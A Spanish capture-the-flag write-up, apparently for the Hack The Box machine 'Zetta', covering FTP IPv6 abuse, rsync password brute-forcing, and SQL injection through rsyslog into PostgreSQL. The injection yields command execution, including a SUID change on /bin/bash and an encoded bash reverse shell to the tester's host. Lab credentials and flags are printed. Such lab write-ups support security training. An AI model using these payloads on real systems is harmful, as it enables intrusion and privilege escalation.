@@ -1,0 +1,741 @@
+---
+layout: post
+title: Zetta
+date: 2023-02-22
+description:
+img:
+fig-caption:
+tags: [OSCP]
+---
+___
+
+<center><img src="/writeups/assets/img/Zetta-htb/Zetta.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Information Disclosure
+
+* Abuso de FTP RFC-2428
+
+* Enumeración de IPv6
+
+* Enumeración de Rsync
+
+* Enumeración de PostgresSQL
+
+* Enumeración de Repositorios de Github
+
+* Inyección SQL (Ejecución de comandos)
+
+* Abuso de LOGs
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.156 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 14:08 GMT
+Nmap scan report for 10.10.10.156
+Host is up (0.14s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 27.41 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p21,22,80 10.10.10.156 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 14:09 GMT
+Nmap scan report for 10.10.10.156
+Host is up (0.068s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Pure-FTPd
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2d8260c18c8d39d2fc8b995ca247f0b0 (RSA)
+|   256 1f1b0e9a91b1105f75209ba08efde4c1 (ECDSA)
+|_  256 b50ca12c1c71dd88a428e089c9a3a0ab (ED25519)
+80/tcp open  http    nginx
+|_http-title: Ze::a Share
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.88 seconds
+```
+
+## Puerto 80 (HTTP)
+
+Con whatweb analizo las tecnologías que está empleando el servidor web
+
+```null
+whatweb http://10.10.10.156
+http://10.10.10.156 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.10.10.156], JQuery, Script[text/javascript], Title[Ze::a Share], ngin
+```
+
+La página principal se ve así
+
+<img src="/writeups/assets/img/Zetta-htb/1.png" alt=">
+
+En una sección dan una pista de que se está utilizando una extensión para el FTP que opera por IPv6
+
+<img src="/writeups/assets/img/Zetta-htb/2.png" alt=">
+
+<img src="/writeups/assets/img/Zetta-htb/3.png" alt=">
+
+Más adelante, aparece un usuario y contraseña para el FTP
+
+<img src="/writeups/assets/img/Zetta-htb/4.png" alt=">
+
+Me puedo conectar
+
+```null
+ftp 10.10.10.156
+Connected to 10.10.10.156.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 500 allowed.
+220-Local time is now 09:29. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+Name (10.10.10.156:rubbx): 73AhuObmLs16MqGoLfoK1Rur5RbLfy6U
+331 User 73AhuObmLs16MqGoLfoK1Rur5RbLfy6U OK. Password required
+Password: 
+230-This server supports FXP transfers
+230-OK. Current restricted directory is /
+230-0 files used (0%) - authorized: 10 files
+230 0 Kbytes used (0%) - authorized: 1024 Kb
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+
+Pero no lista nada
+
+```null
+ftp> dir
+229 Extended Passive mode OK (|||18177|)
+```
+
+Me conecto pero por ```netcat```
+
+```null
+nc 10.10.10.156 21
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 500 allowed.
+220-Local time is now 09:39. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+USER 4N9UwddeJHbikghioKl0WNYmMWVfzHVM
+331 User 4N9UwddeJHbikghioKl0WNYmMWVfzHVM OK. Password required
+PASS 4N9UwddeJHbikghioKl0WNYmMWVfzHVM
+```
+
+Pruebo a conectarme a mi equipo por IPv6 a través del FTP, ya que en caso de que reciba la conexión, podré obtener la IPv6 de la máquina víctima
+
+```null
+EPRT |2|dead:beef:4::1000|8000|
+200-FXP transfer: from fe80::2faf:a6c3:ea90:a312%192 to dead:beef:4::1000%160
+200 PORT command successful
+LIST
+150 Connecting to port 8000
+226-Options: -l 
+226 0 matches totall
+```
+
+```null
+nc -nlvp 8000
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::8000
+Ncat: Listening on 0.0.0.0:8000
+Ncat: Connection from dead:beef::57a:71c:23:77a.
+Ncat: Connection from dead:beef::57a:71c:23:77a:51126.
+```
+
+Realizo otro escaneo pero por IPv6
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS -6 dead:beef::57a:71c:23:77a -oG openportsipv6
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 14:50 GMT
+Nmap scan report for dead:beef::57a:71c:23:77a
+Host is up (0.070s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+8730/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
+```
+
+Tengo alcance a un nuevo puerto
+
+```null
+nmap -sCV -p8730 dead:beef::57a:71c:23:77a -6 --append-output -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 14:52 GMT
+Nmap scan report for dead:beef::57a:71c:23:77a
+Host is up (0.045s latency).
+
+PORT     STATE SERVICE VERSION
+8730/tcp open  rsync   (protocol version 31)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
+```
+
+Lanzo unos scripts especializados para ```rsync```
+
+```null
+nmap -sV --script "rsync-list-modules" -6 dead:beef::57a:71c:23:77a -p8730
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 14:54 GMT
+Nmap scan report for dead:beef::57a:71c:23:77a
+Host is up (0.083s latency).
+
+PORT     STATE SERVICE VERSION
+8730/tcp open  rsync   (protocol version 31)
+| rsync-list-modules: 
+|   ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+|   
+|   You must have explicit, authorized permission to access this rsync
+|   server. Unauthorized attempts and actions to access or use this 
+|   system may result in civil and/or criminal penalties. 
+|   
+|   All activities performed on this device are logged and monitored.
+|   
+|   ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+|   
+|   @ZE::A staff
+|   
+|   This rsync server is solely for access to the zetta master server.
+|   The modules you see are either provided for "Backup access" or for
+|   "Cloud sync".
+|   
+|   
+|   bin            	Backup access to /bin
+|   boot           	Backup access to /boot
+|   lib            	Backup access to /lib
+|   lib64          	Backup access to /lib64
+|   opt            	Backup access to /opt
+|   sbin           	Backup access to /sbin
+|   srv            	Backup access to /srv
+|   usr            	Backup access to /usr
+|_  var            	Backup access to /var
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
+```
+
+Al intentar conectarme de forma maual recibo un error
+
+```null
+rsync -6 rsync://dead:beef::57a:71c:23:77a:8730
+ssh: Could not resolve hostname rsync: No address associated with hostname
+rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]
+rsync error: unexplained error (code 255) at io.c(231) [Receiver=3.2.7]
+```
+
+Para solucionarlo, añado la IPv6 al ```/etc/hosts```, apuntando a cualquier nombre, por ejemplo, ```zetta```
+
+```null
+rsync -6 rsync://zetta:8730
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+bin            	Backup access to /bin
+boot           	Backup access to /boot
+lib            	Backup access to /lib
+lib64          	Backup access to /lib64
+opt            	Backup access to /opt
+sbin           	Backup access to /sbin
+srv            	Backup access to /srv
+usr            	Backup access to /usr
+var            	Backup access to /var
+```
+
+Es posible que existan otros directorios a los que tenga acceso pero que estén ocultos, como ```/etc```. Descargo todo lo que hay ahí
+
+```null
+rsync -6 -r rsync://zetta:8730/etc/ .
+```
+
+Abro el archivo de configuración del ```rsync```, ```rsyncd.conf```. Puedo ver una ruta que corresponde al directorio personal de un usuario y un archivo con secretos, al que no tengo capacidad de lectura. En un comentario referencian a un proyecto de Github
+
+```null
+# Syncable home directory for .dot file sync for me.
+# NOTE: Need to get this into GitHub repository and use git for sync.
+[home_roy]
+    path = /home/roy
+    read only = no
+    # Authenticate user for security reasons.
+    uid = roy
+    gid = roy
+    auth users = roy
+    secrets file = /etc/rsyncd.secrets
+    # Hide home module so that no one tries to access it.
+    list = false
+```
+
+```null
+rsync -6 -r rsync://zetta:8730/etc/rsyncd.secrets
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+-r--------             13 2019/07/27 10:43:25 rsyncd.secrets
+```
+
+
+Para poder conectarme necesito saber la contraseña del usuario ```roy```. El archivo ```rsyncd.secrets```, tiene un tamaño de 13 bytes. Entre estos 4 corresponden a los caracteres de la palabra ```roy:```` y restándole el salto de línea se quedan en 8.
+
+<img src="/writeups/assets/img/Zetta-htb/5.png" alt="">
+
+
+De todo el diccionario ```rockyou.txt```, me quedo con aquellas palabras que tengan 4 caracteres
+
+```null
+cat /usr/share/wordlists/rockyou.txt | grep -E '^.{8}$' > dictionary.txt
+```
+
+
+
+```null
+rsync -6 rsync://zetta:8730/home_roy
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+Password: 
+```
+
+Creo un script en bash que aplique la fuerza bruta
+
+```null
+ #!/bin/bash
+ 
+ function ctrl_c() {
+   exit 1
+ }
+ 
+ # Ctrl+C
+ trap ctrl_c INT
+ 
+ cat dictionary.txt | while read i; do
+   sshpass -p "$i" rsync rsync://roy@zetta:8730/home_roy &>/dev/null
+ 
+   if [ "$(echo $?)" != "5" ]; then
+   
+     echo -e "\n[+] PASS - $i"
+ 
+   fi
+ done; wait
+ ```
+
+Encuentra la contraseña
+
+```null
+./bruteforce.sh
+
+[+] PASS - computer
+```
+
+Descargo todo lo que hay en el directorio personal de ```roy```
+
+```null
+rsync -r -6 rsync://roy@zetta:8730/home_roy
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+Password: 
+drwxr-xr-x          4,096 2021/09/08 10:02:34 .
+lrwxrwxrwx              9 2019/07/27 10:57:06 .bash_history
+-rw-r--r--            220 2019/07/27 07:03:28 .bash_logout
+-rw-r--r--          3,526 2019/07/27 07:03:28 .bashrc
+-rw-r--r--            807 2019/07/27 07:03:28 .profile
+-rw-------          4,752 2019/07/27 09:24:24 .tudu.xml
+-r--r--r--             33 2023/02/22 14:06:08 user.txt
+drwx------          4,096 2021/09/08 10:02:34 .gnupg
+drwx------          4,096 2021/09/08 10:02:34 .gnupg/private-keys-v1.d
+```
+
+Puedo ver la primera flag
+
+```null
+cat user.txt
+19cea4b862bb02edc4a3dec823e0f6bf
+```
+
+Para ganar acceso subo mi clave pública de SSH a la máquina víctima a través del ```rsync```
+
+```null
+mkdir .ssh
+cd .ssh
+cat ~/.ssh/id_rsa.pub > authorized_keys
+chmod 600 authorized_keys
+```
+
+```null
+rsync -r .ssh -6 rsync://roy@zetta:8730/home_roy
+```
+
+Me conecto sin proporcionar contraseña
+
+```null
+ssh roy@zetta
+The authenticity of host 'zetta (dead:beef::57a:71c:23:77a)' can't be established.
+ED25519 key fingerprint is SHA256:7CpQVo0NRhGYfDeknxjt4wNqj/l7nYxaWW8mUOd/xU0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'zetta' (ED25519) to the list of known hosts.
+Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+Last login: Wed Sep  8 06:06:31 2021 from 10.10.14.15
+roy@zetta:~$ 
+```
+
+# Escalada
+
+Abro el archivo ```.tudu.xml```
+
+```null
+cat .tudu.xml | grep title | grep -oP '>.*?<' | tr -d '<>'
+Homepage
+Choose bootstrap theme
+Create temporary homepage
+Add more contents to the homepage
+Add screenshots of the mobile apps
+Add app store links for the mobile apps
+Server
+HTTP Server
+Decide server: Apache vs. nginx
+Install server
+Configure server to serve static pages only
+Copy preliminary homepage to /var/www/html
+Testing
+Configure letsencrypt for HTTPS
+Monitoring
+Network
+Test IPv6 connectivity
+Add ip6tables rules
+Check for IPv4 specific service configuration
+FTP Server
+Decide server: pure-ftpd vs. proftpd
+Install server
+Configure server
+Add authentication module for Ze::a share
+Testing
+Monitoring
+RSYNC Server
+Rework rsyncd.conf because of security incident
+Re-enable /etc syncing for cloud server to work properly again
+Move my dotfile sync from rsync to git.
+SYSLOG Server
+Decide server: syslog-ng vs. rsyslog
+Install server
+Configure server
+Check postgresql log for errors after configuration
+Prototype/test DB push of syslog events
+Testing
+Rework syslog configuration to push all events to the DB
+Find/write GUI for syslog-db access/view
+Security
+Run Lynis and remediate findings.
+Change shared password scheme from &lt;secret&gt;@userid to something more secure.
+```
+
+Se está utilizando un patón de contraseñas que consiste en una palabra seguido de '@' y el usuario
+
+Subo el ```linpeas``` a la máquina, y encuentra un log de postgresql que ha sido modificado en los últimos 5 minutos
+
+```null
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/home/roy/.gnupg/trustdb.gpg
+/home/roy/.gnupg/pubring.kbx
+/home/roy/.ssh/authorized_keys
+/var/log/wtmp
+/var/log/lastlog
+/var/log/postgresql/postgresql-11-main.log
+
+Busco por repositorios de Github desde la raíz
+
+```null
+roy@zetta:/$ find \-name \*.git 2>/dev/null 
+./etc/pure-ftpd/.git
+./etc/nginx/.git
+./etc/rsyslog.d/.git
+```
+
+El ```rsylog.d``` está compuesto por dos commits
+
+```null
+roy@zetta:/etc/rsyslog.d$ git log
+commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
+Author: root <root@zetta.htb>
+Date:   Sat Jul 27 05:51:43 2019 -0400
+
+    Adding/adapting template from manual.
+
+commit c98d292ac2981c0192a59d7cdad9d2d4a25bd4c5
+Author: root <root@zetta.htb>
+Date:   Sat Jul 27 03:11:22 2019 -0400
+
+    Initial revision.
+```
+
+En la primera versión se puede ver una contraseña en texto claro
+
+```null
+roy@zetta:/etc/rsyslog.d$ git show
+commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
+Author: root <root@zetta.htb>
+Date:   Sat Jul 27 05:51:43 2019 -0400
+
+    Adding/adapting template from manual.
+
+diff --git a/pgsql.conf b/pgsql.conf
+index f31836d..9649f68 100644
+--- a/pgsql.conf
++++ b/pgsql.conf
+@@ -1,5 +1,22 @@
+ ### Configuration file for rsyslog-pgsql
+ ### Changes are preserved
+ 
+-module (load="ompgsql")
+-*.* action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="")
++# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
++#
++# Used default template from documentation/source but adapted table
++# name to syslog_lines so the Ruby on Rails application Maurice is
++# coding can use this as SyslogLine object.
++#
++template(name="sql-syslog" type="list" option.sql="on") {
++  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
++  property(name="msg")
++  constant(value="','")
++  property(name="timereported" dateformat="pgsql" date.inUTC="on")
++  constant(value="')")
++}
++
++# load module
++module(load="ompgsql")
++
++# Only forward local7.info for testing.
++local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+```
+
+No es válida para ```postgres```
+
+```null
+roy@zetta:/etc/rsyslog.d$ su postgres
+Password: 
+su: Authentication failure
+```
+
+Me conecto a la base de datos. Pero tampoco me autentica
+
+```null
+roy@zetta:/etc/rsyslog.d$ psql -U postgres -h 127.0.0.1 -d syslog
+Password for user postgres: 
+psql: FATAL:  password authentication failed for user "postgres"
+FATAL:  password authentication failed for user "postgres"
+```
+
+Como estoy en el grupo ```adm```, tengo capacidad de leer los log
+
+```null
+roy@zetta:/var/log/postgresql$ tail -f postgresql-11-main.log
+2023-02-22 12:46:07.279 EST [14909] postgres@syslog FATAL:  password authentication failed for user "postgres"
+2023-02-22 12:46:07.279 EST [14909] postgres@syslog DETAIL:  Password does not match for user "postgres".
+	Connection matched pg_hba.conf line 92: "host    all             all             127.0.0.1/32            md5"
+2023-02-22 12:46:07.282 EST [14910] postgres@syslog FATAL:  password authentication failed for user "postgres"
+2023-02-22 12:46:07.282 EST [14910] postgres@syslog DETAIL:  Password does not match for user "postgres".
+	Connection matched pg_hba.conf line 92: "host    all             all             127.0.0.1/32            md5"
+```
+
+La query que se encarga de crear el log es visible aplicando la diferenciación el los commits del repositorio. A la hora de incorporar los valores, está abriendo una comilla que cierra tras el último valor. Se puede tratar de efectuar una inyección SQL
+
+Con ```logger```, puedo insertar el mensaje directamente al sistema, pero para ello tengo que pasarle la directiva, que ya la tengo y su valor el ```local7.info```
+
+```null
+roy@zetta:/etc/rsyslog.d$ logger -p local7.info "'"
+```
+
+Ahora en el log me aparece un warning
+
+```null
+roy@zetta:/var/log/postgresql$ tail -f postgresql-11-main.log
+2023-02-22 13:03:20.774 EST [15053] postgres@syslog ERROR:  syntax error at or near "2023" at character 71
+2023-02-22 13:03:20.774 EST [15053] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' \'','2023-02-22 18:03:20')
+2023-02-22 13:03:20.780 EST [15054] postgres@syslog ERROR:  syntax error at or near "2023" at character 71
+2023-02-22 13:03:20.780 EST [15054] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' \'','2023-02-22 18:03:20')
+2023-02-22 13:03:20.785 EST [15055] postgres@syslog WARNING:  there is no transaction in progress
+tail: postgresql-11-main.log: file truncated
+```
+
+La idea es maniobrar sobre esté para aislar los dos campos y comentar el resto para que no entren en conflicto
+
+```null
+roy@zetta:/etc/rsyslog.d$ logger -p local7.info "campo1',campo2);-- -"
+```
+
+```null
+roy@zetta:/var/log/postgresql$ tail -f postgresql-11-main.log
+2023-02-22 13:06:09.109 EST [15078] postgres@syslog ERROR:  column "campo2" does not exist at character 75
+2023-02-22 13:06:09.109 EST [15078] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' campo1\',campo2)-- -','2023-02-22 18:06:09')
+2023-02-22 13:06:09.120 EST [15088] postgres@syslog ERROR:  column "campo2" does not exist at character 75
+2023-02-22 13:06:09.120 EST [15088] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' campo1\',campo2)-- -','2023-02-22 18:06:09')
+2023-02-22 13:06:09.128 EST [15089] postgres@syslog WARNING:  there is no transaction in progress
+2023-02-22 13:06:32.997 EST [15089] postgres@syslog ERROR:  column "campo2" does not exist at character 75
+2023-02-22 13:06:32.997 EST [15089] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' campo1\',campo2);-- -','2023-02-22 18:06:32')
+2023-02-22 13:06:33.008 EST [15092] postgres@syslog ERROR:  column "campo2" does not exist at character 75
+2023-02-22 13:06:33.008 EST [15092] postgres@syslog STATEMENT:  INSERT INTO syslog_lines (message, devicereportedtime) values (' campo1\',campo2);-- -','2023-02-22 18:06:32')
+2023-02-22 13:06:33.019 EST [15093] postgres@syslog WARNING:  there is no transaction in progress
+```
+
+Para que el log no lo reporte, se puede utilizar un valor nulo. Eso significa que no hay ningún error y está todo funcionando correctamente
+
+```null
+roy@zetta:/etc/rsyslog.d$ logger -p local7.info "campo1',NULL);-- -"
+```
+
+En ```Postgresql```, se pueden ejecutar comandos a nivel de sistema en caso de contar con el privilegio. Para que no provoquen un error las comillas simples, las respresento utilizando ```$$```
+
+```null
+roy@zetta:/etc/rsyslog.d$ logger -p local7.info "campo1',NULL); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \$$ chmod u+s /bin/bash \$$;-- -"
+```
+
+Me envío una reverse shell como ```postsql
+
+```null
+echo 'bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"' | base64 -w 0 | xclip -sel clip
+```
+
+```null
+roy@zetta:/etc/rsyslog.d$ logger -p local7.info "campo1',NULL); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \$$ echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxIgo=|base64 -d|bash \$$;-- -"
+```
+
+Y la recibo en una sesión de ```netcat```
+
+```null
+nc -nlvp 443
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.156.
+Ncat: Connection from 10.10.10.156:56782.
+bash: cannot set terminal process group (15316): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@zetta:/var/lib/postgresql/11/main$ 
+postgres@zetta:/var/lib/postgresql/11/main$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+postgres@zetta:/var/lib/postgresql/11/main$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+postgres@zetta:/var/lib/postgresql/11/main$ export TERM=xterm
+postgres@zetta:/var/lib/postgresql/11/main$ export SHELL=bash
+postgres@zetta:/var/lib/postgresql/11/main$ stty rows 55 columns 209
+```
+
+En su directorio personal hay un histórico de ```Postgresql```
+
+```null
+postgres@zetta:/var/lib/postgresql$ ls -la
+total 24
+drwxr-xr-x  5 postgres postgres 4096 Feb 22 13:28 .
+drwxr-xr-x 28 root     root     4096 Jul 16  2021 ..
+drwxr-xr-x  3 postgres postgres 4096 Jul 27  2019 11
+lrwxrwxrwx  1 root     root        9 Jul 27  2019 .bash_history -> /dev/null
+drwx------  3 postgres postgres 4096 Feb 22 13:28 .gnupg
+-rw-------  1 postgres postgres  744 Jul 27  2019 .psql_history
+drwx------  2 postgres postgres 4096 Jul 27  2019 .ssh
+```
+
+Dentro tiene una contraseña
+
+```null
+postgres@zetta:/var/lib/postgresql$ cat .psql_history 
+CREATE DATABASE syslog;
+\c syslog
+CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
+\d syslog_lines
+ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
+```
+
+No es válida para ```root```, pero si la cambio por ```'sup3rs3cur3p4ass@root```, según el convenio de antes sí
+
+```null
+postgres@zetta:/var/lib/postgresql$ su root
+Password: 
+root@zetta:/var/lib/postgresql# cat /root/root.txt 
+e6e85de0632bb8ac760f0a69e2b163c0
+```
